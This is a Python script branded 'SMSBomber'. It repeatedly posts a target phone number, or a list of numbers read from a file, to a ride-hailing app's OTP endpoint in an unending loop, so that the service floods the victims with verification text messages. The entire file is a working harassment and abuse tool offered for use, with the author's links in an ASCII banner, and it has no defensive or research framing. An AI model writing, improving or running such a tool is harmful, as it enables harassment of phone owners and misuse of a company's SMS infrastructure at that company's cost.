from colorama import Fore
import subprocess
import requests
import platform
import json
import time
osname = platform.uname()[0]
def clear_shell():
    if osname == 'Windows':
        subprocess.call(("cls"),shell=True)
    else:
        subprocess.call(("clear"),shell=True)
clear_shell()
def sendsms(number):
    payload = {
        "cellphone":number
    }
    result = requests.post(
    'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp/',
    data=payload
    )
    # print(result.text)
    if result.status_code == 200:
        status = True
    else:
        status = False
        
    return status
    

def start():
    print(b"\n                 .-~*~--,.   .-.\n          .-~-. ./OOOOOOOOO\\.'OOO`9~~-.\n        .`OOOOOO.OOM.OLSONOOOOO@@OOOOOO\\\n       /OOOO@@@OO@@@OO@@@OOO@@@@@@@@OOOO`.\n       |OO@@@WWWW@@@@OOWWW@WWWW@@@@@@@OOOO).\n     .-'OO@@@@WW@@@W@WWWWWWWWOOWW@@@@@OOOOOO}\n    /OOO@@O@@@@W@@@@@OOWWWWWOOWOO@@@OOO@@@OO|\n   lOOO@@@OO@@@WWWWWWW\\OWWWO\\WWWOOOOOO@@@O.'\n    \\OOO@@@OOO@@@@@@OOW\\     \\WWWW@@@@@@@O'.\n     `,OO@@@OOOOOOOOOOWW\\     \\WWWW@@@@@@OOO)\n      \\,O@@@@@OOOOOOWWWWW\\     \\WW@@@@@OOOO.'\n        `~c~8~@@@@WWW@@W\\       \\WOO|\\UO-~'\n             (OWWWWWW@/\\W\\    ___\\WO)\n               `~-~''     \\   \\WW=*'\n                         __\\   \\\n        SMSBomber        \\      \\\n                          \\    __\\\n                           \\  \\\n  https://mihanconsole.ir   \\ \\\n  https://t.me/ehsan_goli    \\ \\\n                              \\\\\n                               \\\\\n                                \\\n                                 \\".decode())
    print("""
    1) Singel PHONE Number   2) Combo
""")
    num = input("SMSbomber/Home/$ ")
    
    if num == "1":
        print("\n\nPlease Enter Number:")
        print("Example: +989931340980\n")
        
        cellphone = input("SMSbomber/Singel/# ")
        print("")
        while True:
            try:
                stat = sendsms(cellphone)
                
                if stat == True:
                    print("SMS Send To: "+cellphone)
                else:
                    print("PHONE Number This ban!")
            except:
                print("\nstoping process ...")
                break
        input("\nSMSbomber/Singel/# Back To Menu (PROCESS ENTER) ")
    
    elif num == "2":
        print("\n\nPlease Enter PHONE Number List!")
        combo = input("SMSbomber/Combo/# ")
        try:
            combo = open(combo,mode='r').read().split()
            
        except FileNotFoundError:
            print("SMSbomber/Combo/$ Combo file not found!")
            input("SMSbomber/Combo/# Back To Menu (PROCESS ENTER) ")
            combo = []
        print("")
        
        while True:
            try:
                if not len(combo) == 0:
                    for number in combo:
                        stat = sendsms(number)
                    
                        if stat == True:
                            print("SMS Send To: "+number)
                            
                        else:
                            print(f"PHONE Number: {number} Is ban!")
                else:
                    break
            except KeyboardInterrupt:
                print("\nstoping process ...")
                input("SMSbomber/Combo/# Back To Menu (PROCESS ENTER) ")
                break

while True:
    try:
        start()
    except KeyboardInterrupt:
        print("Good by ...")
        break
    